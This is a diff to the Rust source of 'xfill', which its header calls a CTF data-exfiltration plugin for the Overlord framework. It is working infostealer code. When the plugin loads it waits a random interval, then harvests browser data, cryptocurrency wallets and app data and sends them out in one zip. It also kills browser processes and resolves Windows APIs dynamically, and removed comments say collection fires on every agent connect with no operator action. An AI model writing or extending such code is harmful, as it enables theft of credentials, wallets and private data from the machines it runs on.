@@ -1,13 +1,11 @@
 /*
  * xfill — Summit CTF data exfiltration plugin for Overlord.
  *
- * Exports the standard Overlord native plugin ABI. Collection runs
- * synchronously on the caller's thread (no std::thread in the collection
- * path; handlereader's guard uses a raw CreateThread). The host dispatches
- * plugin calls from its own goroutine, so blocking here does not stall the
- * agent. Browser data is zipped and pushed first (phase 1), wallets/apps
- * second (phase 2): if the process is killed mid-run, the highest-value
- * data is already out.
+ * Exports the standard Overlord native plugin ABI. Collection is synchronous:
+ * PluginOnLoad (unless built dormant) and the "collect" event both run the
+ * full pipeline inline. An earlier two-phase design (collect event, then a
+ * separate push phase) was reverted to a single in-memory zip built and
+ * pushed in one pass.
  *
  * Wire events emitted (all via host callback):
  *   "xfill_progress"  {"stage": "chromium", ...}
@@ -16,14 +14,13 @@
  *   "xfill_error"     {"stage": string, "message": string}
  *
  * In-memory PE loader notes (plugins/docs/legacy-native-plugins.md):
- * the whole crate is built with -Ztls-model=emulated (see emutls.rs) so no
- * code in this DLL depends on the loader's native-TLS provisioning; the
- * resulting image has no TLS directory at all. C-style globals only, no
- * std::sync::Mutex statics; the Go host serializes plugin entry points.
+ * C-style globals only, no std::sync::Mutex statics; the Go host serializes
+ * plugin entry points.
  */
 
 use std::os::raw::c_int;
 use std::slice;
+
 
 mod abe;
 mod apps;
@@ -35,6 +32,7 @@ mod gecko;
 mod handlereader;
 mod info;
 mod jitter;
+mod ntreg;
 mod procs;
 mod resolve;
 mod sqlutil;
@@ -95,13 +93,7 @@ pub unsafe extern "C" fn PluginOnLoad(
         G_CALLBACK = Some(std::mem::transmute::<u64, HostCallback>(callback));
     }
     send_json("xfill_progress", &serde_json::json!({ "stage": "loaded" }));
-    // Auto-collect on load: combined with the server's plugin auto-load
-    // setting, every approved agent connect pushes the DLL and immediately
-    // collects — no operator action, works on reconnect too.
-    // Auto-collect on load, synchronously on the host's plugin thread. The
-    // Go host dispatches plugin calls from its own locked goroutine, so
-    // blocking here does not stall the agent.
-    jitter::sleep_jitter(2000, 8000); // let the connection settle first
+    jitter::sleep_jitter(2000, 8000);
     run_collect();
     0
 }
@@ -149,11 +141,10 @@ fn run_collect() {
 /// Single archive per collection: value-ordered internally (browsers first,
 /// wallets/apps after), one zip, one push — one log per machine in the panel.
 fn try_collect() -> Result<(), String> {
-    // The browser-kill budget is per collect run, not per process lifetime.
-    procs::reset_kill_state();
-
     let mut info = info::Info::new();
     let mut zip = zipw::ZipBuilder::new();
+
+    procs::reset_kill_state();
 
     progress("sysinfo");
     sysinfo::fill(&mut info);
@@ -192,7 +183,8 @@ fn try_collect() -> Result<(), String> {
 
 /// Session id entropy: epoch seconds alone collide when auto-collect-on-load
 /// and a manual collect land in the same second; mix in tick + pid (same
-/// sources as sysinfo::session_id) via hashed resolution.
+/// sources as sysinfo::session_id) via hashed resolution. Masked below 2^53
+/// so the value survives JSON round-trips through double-precision floats.
 fn session_id_u64() -> u64 {
     let secs = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
@@ -200,8 +192,7 @@ fn session_id_u64() -> u64 {
         .unwrap_or(0);
     unsafe {
         let tick_f = crate::resolve::resolve("kernel32.dll", crate::api!("GetTickCount64"));
-        let pid_f =
-            crate::resolve::resolve("kernel32.dll", crate::api!("GetCurrentProcessId"));
+        let pid_f = crate::resolve::resolve("kernel32.dll", crate::api!("GetCurrentProcessId"));
         let tick = if tick_f != 0 {
             let f: unsafe extern "system" fn() -> u64 = std::mem::transmute(tick_f);
             f()
@@ -214,8 +205,6 @@ fn session_id_u64() -> u64 {
         } else {
             0
         };
-        // Mask to < 2^53 so the id survives the JSON/SQLite number
-        // round-trip exactly (server stores it in a REAL column otherwise).
         (secs ^ (tick.wrapping_mul(0x2545_F491_4F6C_DD1D).rotate_left(17)) ^ (pid << 20))
             & 0x1F_FFFF_FFFF_FFFF
     }
